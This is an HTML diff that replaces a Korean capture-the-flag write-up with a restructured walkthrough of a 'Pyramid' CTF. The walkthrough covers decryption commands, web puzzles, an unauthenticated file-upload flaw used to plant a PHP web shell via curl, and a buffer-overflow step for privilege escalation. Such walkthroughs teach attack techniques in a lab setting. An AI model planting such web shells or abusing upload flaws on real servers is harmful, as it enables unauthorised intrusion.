-          >이 파일을 다시 상기시켜보면 맨 마지막 줄에 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >magic<span lang="KO">은 </span>1<span lang="KO"
-            >분마다 일어난다고 되어있습니다</span
-          >.</span
-        >
-      </p>
+            <p>
+              동시에 페이지 상에는 base64 인코딩된 암호문이 주어지며,
+              해당 값을 변수 <code>b64</code>로 사용하도록 가이드가 포함되어 있다.
+            </p>
+          </section>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >실제로 우리는 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/ <span lang="KO">에는 </span>‘papyrus’, ‘room’,
-          ‘rosetta_stone”<span lang="KO">이 </span>3<span lang="KO"
-            >개의 파일 및 디렉터리와 방금 우리가 생성해낸 </span
-          >‘magi.c’ <span lang="KO">하나만이 존재했습니다</span>.</span
-        >
-      </p>
+          <section>
+            <h3>3. Base64 디코딩 및 AES-128-CBC 복호화</h3>
+            <p>
+              제공된 스크립트 흐름에 맞추어 payload를 단계적으로 처리하여 평문을 얻었다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="372"
-            height="53"
-            id="그림 22"
-            src="images/image054.png"
-        /></span>
-      </p>
+            <ol class="number-list">
+              <li><strong>base64 디코딩:</strong> <code>b64</code>를 디코딩하여 <code>/tmp/payload.bin</code>으로 저장.</li>
+              <li><strong>IV 추출:</strong> 파일의 처음 16바이트를 IV로 사용하고, 나머지 부분을 암호문으로 분리.</li>
+              <li><strong>AES 복호화:</strong> 파생된 키(<code>keyhex</code>)와 IV를 사용해 AES-128-CBC 모드로 복호화.</li>
+            </ol>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 92pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >하지만 다시</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">
-          /home/khufu/ <span lang="KO">를 확인해보면 </span>‘magic’<span
-            lang="KO"
-            >이라는 존재하지 않던 파일을 확인할 수 있고</span
-          >
-          1<span lang="KO">분마다 </span>magi.c<span lang="KO"
-            >가 존재한다면 </span
-          >magic<span lang="KO"
-            >이라는 파일이 생기는 것을 확인할 수 있습니다</span
-          >.</span
-        >
-      </p>
+            <pre class="code-block">
+echo -n "$b64" | base64 -d > /tmp/payload.bin
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 74pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="496"
-            height="246"
-            id="그림 23"
-            src="images/image055.png"
-        /></span>
-      </p>
+ivhex=$(xxd -p -l 16 /tmp/payload.bin | tr -d '\n')
+dd if=/tmp/payload.bin of=/tmp/cipher.bin bs=1 skip=16 status=none
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 92pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘magic’ <span lang="KO">파일을 실행하니 </span>“ .</span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Segoe UI Historic', sans-serif;
-          "
-          >&#78780;&#78193;&#78061;&#77991;&#78146;&#78358;</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">_</span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Segoe UI Historic', sans-serif;
-          "
-          >&#78350;&#78146;&#78284;</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">
-          “ <span lang="KO">라는 알 수 없는 숨겨진 파일이 나왔습니다</span>,
-          <span lang="KO">읽을 수 있는 파일이니 읽어봅시다</span> (
-          <span lang="KO"
-            >파일 읽기를 시도할 때 저 파일의 이름을 직접 타이핑하기 어려우니
-            복사 붙여넣기를 통해 시도합니다</span
-          >. )</span
-        >
-      </p>
+openssl enc -d -aes-128-cbc -in /tmp/cipher.bin \
+  -K "$keyhex" -iv "$ivhex" -out /tmp/plain.txt 2>/tmp/openssl.err || true
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 74pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="315"
-            height="48"
-            id="그림 25"
-            src="images/image056.png"
-        /></span>
-      </p>
+cat /tmp/plain.txt
+            </pre>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 92pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><i
-          ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-            >“</span
-          ></i
-        ><i
-          ><span
-            style="
-              line-height: 107%;
-              font-family: 'Segoe UI Historic', sans-serif;
-            "
-            >&#78861;&#78780;&#77991;&#78163;&#78753;&#78061;&#78467;&#78016;&#78799;&#78420;&#78358;&#78350;&#78225;&#78506;&#77963;&#78284;&#78143;&#78580;&#78193;&#78283;</span
-          ></i
-        ><i
-          ><span style="line-height: 107%; font-family: 'Noto Sans KR'">
-            =&gt; (...) =&gt; 58”</span
-          ></i
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >라는 결과 값이 나왔고 이제 저 힌트를 활용해봅시다</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">.</span>
-      </p>
+            <figure>
+              <img src="images/image023.png" alt="복호화 결과 화면" />
+              <figcaption>복호화된 평문에서 다음 단계 비밀번호 추출</figcaption>
+            </figure>
 
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <i
-          ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-            >&nbsp;</span
-          ></i
-        >
-      </p>
+            <p>
+              최종 평문에서 <code>luckforyournext_!21!</code> 형태의 문자열을 확인했고,
+              이는 이후 웹 게임 단계 진입 시 사용하는 패스워드로 활용되었다.
+            </p>
+          </section>
+        </article>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >12.<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >Decoding&amp;Encoding</span
-        >
-      </p>
+        <!-- Pyramid 3 -->
+        <article id="pyramid3" class="walkthrough-section">
+          <header>
+            <h2>Pyramid 3 – Web Game & File Upload Exploitation</h2>
+            <p class="meta">
+              목표: 다단계 웹 페이지 내 숨겨진 힌트와 간단한 크립토를 통해 다음 경로를 찾고,
+              파일 업로드 취약점을 이용해 웹 셸을 업로드하여 flag를 획득한다.
+            </p>
+          </header>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="602"
-            height="514"
-            id="그림 26"
-            src="images/image057.jpg"
-        /></span>
-      </p>
+          <section>
+            <h3>1. game.php 진입 및 다중 페이지 플로우</h3>
+            <p>
+              앞 단계에서 얻은 비밀번호 <code>luckforyournext_!21!</code>를 이용해
+              <code>game.php</code>에 진입한다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >계속 글에 등장하는 저 상형문자는 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘Hieroglphs’<span lang="KO">라는 명칭을 가지고 있으며 </span>‘ancient
-          Egyptian words’
-          <span lang="KO"
-            >같은 이름으로 검색을하여도 인터넷에서 많은 정보를 찾을 수
-            있습니다</span
-          >,
-          <span lang="KO"
-            >역시 이 문자를 디코딩해주는 사이트도 존재하고 이를 이용해 한 번
-            디코딩해봅시다</span
-          >.</span
-        >
-      </p>
+            <figure>
+              <img src="images/image026.jpg" alt="game.php 진입 화면" />
+              <figcaption>비밀번호 입력 후 game.php 진입</figcaption>
+            </figure>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="602"
-            height="530"
-            id="그림 28"
-            src="images/image058.jpg"
-        /></span>
-      </p>
+            <ul class="bullet-list">
+              <li>
+                첫 번째 이미지 → <code>mirro.php</code>: 미로 탈출 후 flag
+                <code>uvrebtylcuvp</code> 획득 → ROT13 디코딩 → <code>hieroglyphic</code> 도출.
+              </li>
+              <li>
+                두 번째 이미지 → <code>image.php</code>: 특정 영역 클릭 시 다음 페이지 이름
+                <code>chamber</code>에 대한 모달 힌트 확인.
+              </li>
+            </ul>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >디코딩 시 </span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >“<span style="color: black; background: #f8efd3"
-            >xgdmklzbthnqfpryAswi”</span
-          ><span lang="KO" style="color: black; background: white"
-            >라는 문자열이 나옵니다</span
-          ><span style="color: black; background: white"
-            >, <span lang="KO">하지만 </span><i>&quot; </i></span
-          ></span
-        ><i
-          ><span
-            style="
-              line-height: 107%;
-              font-family: 'Segoe UI Historic', sans-serif;
-              color: black;
-              background: white;
-            "
-            >&#78861;&#78780;&#77991;&#78163;&#78753;&#78061;&#78467;&#78016;&#78799;&#78420;&#78358;&#78350;&#78225;&#78506;&#77963;&#78284;&#78143;&#78580;&#78193;&#78283;</span
-          ></i
-        ><i
-          ><span
-            style="
-              line-height: 107%;
-              font-family: 'Noto Sans KR';
-              color: black;
-              background: white;
-            "
-          >
-            =&gt; (...) =&gt; 58 &quot;</span
-          ></i
-        ><span
-          lang="KO"
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >라는 결과에서 과정이 하나가 더 있었고 </span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >“(…) =&gt; 58”<span lang="KO">이라는 과정을 보아 </span>base58<span
-            lang="KO"
-            >로 </span
-          >encoding<span lang="KO">을 시도해봅시다</span>.</span
-        >
-      </p>
+            <figure>
+              <img src="images/image028.jpg" alt="미로 클리어 후 ROT13 전 flag" />
+              <figcaption>미로 클리어 후 얻은 ROT13 인코딩 flag</figcaption>
+            </figure>
+          </section>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="602"
-            height="470"
-            id="그림 29"
-            src="images/image059.jpg"
-        /></span>
-      </p>
+          <section>
+            <h3>2. 이집트 상형문자 해석 및 Tomb.php 유도</h3>
+            <p>
+              <code>chamber.php</code>에 접속하여 앞서 얻은 비밀번호
+              <code>hieroglyphic</code>를 입력하면, 화면에는 이집트 상형문자로 작성된 암호문이 나타난다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >“2gHsQQTDGYNerJuyFFGeUkFEVDj6”<span lang="KO"
-            >라는 결과 값이 나왔고 이를</span
-          >
-          ‘tutankhamun’ <span lang="KO">계정에 접속 시도해봅시다</span>.</span
-        >
-      </p>
+            <p>
+              상형문자-알파벳 매핑 표를 참고해 해석한 결과 <code>artifact</code>라는 flag를 얻었고,
+              특정 위치 클릭 시 다음 페이지 이름 <code>Tomb</code>에 대한 모달 힌트를 통해
+              <code>Tomb.php</code>로의 이동을 유도한다.
+            </p>
 
-      <span
-        style="
-          font-size: 10pt;
-          line-height: 107%;
-          font-family: 'Noto Sans KR';
-          color: black;
-          background: white;
-        "
-        ><br clear="all" style="page-break-before: always" />
-      </span>
+            <figure>
+              <img src="images/image033.jpg" alt="chamber.php 상형문자 화면" />
+              <figcaption>이집트 상형문자를 해석해 artifact flag 획득</figcaption>
+            </figure>
+          </section>
 
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            background: white;
-          "
-          >&nbsp;</span
-        >
-      </p>
+          <section>
+            <h3>3. Tomb.php 파일 업로드 취약점 이용</h3>
+            <p>
+              <code>Tomb.php</code>에서 <code>artifact</code>를 비밀번호로 입력하면,
+              파일 업로드 UI가 나타나지만 직접 업로드 시에는 권한 부족으로 거부된다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left"
-      >
-        <span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            background: white;
-          "
-          >&nbsp;</span
-        >
-      </p>
+            <p>
+              그러나 서버 측 업로드 처리 스크립트 <code>upload.php</code>는 세션 또는 권한 검증 없이
+              업로드를 허용하는 취약점이 존재하여, 직접 POST 요청을 보내면 임의 파일을 업로드할 수 있다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 56pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >13.<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >Final flag</span
-        >
-      </p>
+            <figure>
+              <img src="images/image036.jpg" alt="Tomb 업로드 페이지 화면" />
+              <figcaption>사용자 인터페이스 상에서는 업로드가 제한된 모습</figcaption>
+            </figure>
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          ><img
-            border="0"
-            width="377"
-            height="113"
-            id="그림 30"
-            src="images/image060.png"
-        /></span>
-      </p>
+            <p>
+              다음과 같이 간단한 PHP 셸 파일을 준비하고, curl을 이용해 업로드를 수행하였다.
+            </p>
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >Tutankhamun <span lang="KO">계정에 성공적으로 접속했고 </span>root
-          directory<span lang="KO">로 이동하니 </span>‘flag’<span lang="KO"
-            >를 발견할 수 있었습니다</span
-          >.</span
-        >
-      </p>
+            <pre class="code-block">
+# 1) test.php 작성
+&lt;?php system($_GET['cmd']); ?&gt;
 
-      <p
-        class="MsoNormal"
-        align="left"
-        style="margin-left: 56pt; text-align: left"
-      >
-        <span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          ><img
-            border="0"
-            width="602"
-            height="393"
-            id="그림 31"
-            src="images/image061.png"
-        /></span>
-      </p>
+# 2) curl을 사용해 upload.php로 직접 업로드 (서버는 예시 IP)
+curl -v -F "file=@./test.php;filename=shell.php" \
+  http://192.168.16.15/upload.php
 
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 74pt; text-align: left; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span
-          style="
-            line-height: 107%;
-            font-family: 'Noto Sans KR';
-            color: black;
-            background: white;
-          "
-          >Flag <span lang="KO">발견 끝</span>.</span
-        >
-      </p>
-    </div>
+# 3) /uploads 디렉터리 접근
+#    (디렉터리는 dirb 등으로 브루트포싱 가능)
+            </pre>
+
+            <figure>
+              <img src="images/image039.jpg" alt="/uploads 내 shell.php 확인" />
+              <figcaption>/uploads 디렉터리에서 업로드된 shell.php 확인</figcaption>
+            </figure>
+
+            <p>
+              업로드된 <code>shell.php</code>에 접근해 명령 실행 또는 flag 출력을 확인할 수 있었고,
+              이 flag는 다음 SSH 단계의 사용자 비밀번호로 사용되었다.
+            </p>
+
+            <figure>
+              <img src="images/image040.png" alt="웹 셸을 통한 flag 획득" />
+              <figcaption>웹 셸 페이지에서 flag 확인</figcaption>
+            </figure>
+          </section>
+        </article>
+
+        <!-- Pyramid 4 -->
+        <article id="pyramid4" class="walkthrough-section">
+          <header>
+            <h2>Pyramid 4 – Linux Local Privilege Escalation</h2>
+            <p class="meta">
+              목표: SSH를 통해 리눅스 환경에 진입한 뒤, C 기반 BoF 취약한 바이너리와 파편화된 코드를 분석하여
+              상위 계정으로 이동하고 최종 root flag를 획득한다.
+            </p>
+          </header>
+
+          <section>
+            <h3>1. SSH 진입 및 초기 정찰</h3>
+            <p>
+              앞 단계에서 얻은 정보를 바탕으로 <code>khufu</code> 계정으로 SSH 접속을 시도하였다.
+            </p>
+
+            <figure>
+              <img src="images/image041.png" alt="khufu SSH 접속 화면" />
+              <figcaption>khufu 계정 SSH 로그인</figcaption>
+            </figure>
+
+            <p>
+              로그인 후 <code>ls -la</code>로 홈 디렉터리 구조를 확인한 결과,
+              <code>papyrus</code>, <code>room/</code>, <code>rosetta_stone</code> 등의 파일과 디렉터리가 존재하는 것을 확인하였다.
+            </p>
+
+            <figure>
+              <img src="images/image042.png" alt="khufu 홈 디렉터리 구조" />
+              <figcaption>khufu 홈 디렉터리 내 주요 아티팩트</figcaption>
+            </figure>
+          </section>
+
+          <section>
+            <h3>2. room 디렉터리 분석 및 C 코드 조립</h3>
+            <p>
+              <code>/home/khufu/room</code> 하위에는 <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code> 등의 디렉터리가 존재하며,
+              이 중 1, 2, 4 디렉터리에는 공통된 이름의 <code>offering</code> 파일이 포함되어 있었다.
+            </p>
+
+            <figure>
+              <img src="images/image045.png" alt="room 디렉터리 구조" />
+              <figcaption>room 디렉터리와 하위 디렉터리들</figcaption>
+            </figure>
+
+            <p>
+              각 <code>offering</code> 파일에는 C 코드 일부가 담겨 있었고,
+              이를 조합하면 <code>system()</code> 호출과 <code>strcpy(altar, offering)</code> 구문을 포함하는 하나의 C 프로그램이 완성되었다.
+            </p>
+
+            <pre class="code-block">
+char code[] = "touch /home/khufu/.&lt;encoded_path&gt;";
+int core = system(code);
+
+char guard[1];
+char altar[7];
+// ...
+strcpy(altar, offering);
+            </pre>
+
+            <p>
+              <code>altar</code> 버퍼 크기보다 큰 입력을 <code>offering</code>에 주입하면
+              버퍼 오버플로우가 발생할 수 있고, 이를 통해 의도한 파일 생성이나 코드 흐름 제어가 가능하다는 점을 파악하였다.
+            </p>
+          </section>
+
+          <section>
+            <h3>3. book_pen 활용 및 상위 계정 획득</h3>
+            <p>
+              room 디렉터리 내 <code>book_pen</code> 바이너리는 사용자의 입력을 <code>offering</code>에 반영하고,
+              취약한 C 코드 로직을 수행하는 역할을 했다.
+            </p>
+
+            <figure>
+              <img src="images/image048.png" alt="book_pen 실행 예시" />
+              <figcaption>book_pen 바이너리 실행 및 입력 전달</figcaption>
+            </figure>
+
+            <p>
+              특정 패턴의 입력을 사용하여 내부 로직이 숨겨진 경로에 파일을 생성하도록 유도하였고,
+              이 과정을 통해 최종적으로 상위 계정(<code>tutankhamun</code>)에 대한 비밀번호
+              <code>2gHsQQTDGYNerJuyFFGeUkFEVDj6</code>를 추출해 SSH 접속에 성공하였다.
+            </p>
+
+            <figure>
+              <img src="images/image059.jpg" alt="tutankhamun 패스워드 도출" />
+              <figcaption>book_pen 실행 결과에서 tutankhamun 패스워드 도출</figcaption>
+            </figure>
+          </section>
+
+          <section>
+            <h3>4. 최종 root flag 획득</h3>
+            <p>
+              <code>tutankhamun</code> 계정으로 로그인한 뒤, 상위 권한이 필요한 디렉터리와 파일을 탐색하여
+              루트 디렉터리 내부에 위치한 최종 <code>flag</code> 파일을 확인하였다.
+            </p>
+
+            <figure>
+              <img src="images/image061.png" alt="root 디렉터리에서 최종 flag 확인" />
+              <figcaption>root 디렉터리 내 최종 flag 파일</figcaption>
+            </figure>
+
+            <p>
+              파일 내용을 확인함으로써 Pyramid CTF 전 스테이지에 대한 공격 체인과 권한 상승 경로를
+              모두 완주하였다.
+            </p>
+          </section>
+        </article>
+      </section>
+    </main>
   </body>
 </html>
